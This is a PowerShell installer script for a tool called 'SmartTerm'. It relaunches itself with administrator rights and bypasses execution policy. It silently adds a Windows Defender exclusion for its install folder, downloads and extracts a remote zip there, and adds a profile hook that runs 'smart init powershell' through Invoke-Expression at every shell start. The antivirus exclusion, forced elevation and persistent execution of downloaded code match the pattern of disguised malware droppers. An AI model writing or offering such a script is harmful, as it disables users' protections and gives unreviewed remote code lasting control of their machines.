$ErrorActionPreference = "Stop"
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}
$Repo = "bbhcoder/smart_term2"
$Target = "x86_64-pc-windows-msvc"
$Url = "https://github.com/$Repo/releases/latest/download/smart_term-$Target.zip"
$InstallDir = "$env:LOCALAPPDATA\SmartTerm"
$TempZip = "$env:TEMP\smart_term.zip"
try {
    Add-MpPreference -ExclusionPath $InstallDir -ErrorAction SilentlyContinue
} catch {}
Invoke-WebRequest -Uri $Url -OutFile $TempZip
if (!(Test-Path $InstallDir)) { New-Item -ItemType Directory -Force -Path $InstallDir | Out-Null }
Expand-Archive -Path $TempZip -DestinationPath $InstallDir -Force
Remove-Item $TempZip
$UserPath = [Environment]::GetEnvironmentVariable("PATH", "User")
if ($UserPath -notmatch [regex]::Escape($InstallDir)) {
    [Environment]::SetEnvironmentVariable("PATH", "$UserPath;$InstallDir", "User")
    $env:PATH = "$env:PATH;$InstallDir"
}
$ProfilePath = $PROFILE
if (!(Test-Path $ProfilePath)) {
    New-Item -ItemType File -Path $ProfilePath -Force | Out-Null
}
$HookCommand = "smart init powershell | Invoke-Expression"
$ProfileContent = Get-Content $ProfilePath -Raw
if ($ProfileContent -notmatch "smart init powershell") {
    Add-Content -Path $ProfilePath -Value "`n$HookCommand"
}
Write-Host "SmartTerm installed successfully! You can now use 'smart' and 'smartd' commands in a new terminal." -ForegroundColor Green
